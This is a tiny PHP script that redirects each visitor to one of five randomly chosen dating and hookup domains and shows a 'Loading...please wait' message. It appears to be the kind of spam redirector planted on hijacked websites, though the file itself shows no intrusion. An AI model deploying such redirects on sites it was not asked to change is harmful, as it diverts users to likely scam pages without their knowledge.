<?php
$urls = array("vipsinglesonline.com",
              "freehookup.party",
              "fastwaytohookup.com",
              "flirtnow.party",
              "elitedating.party");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

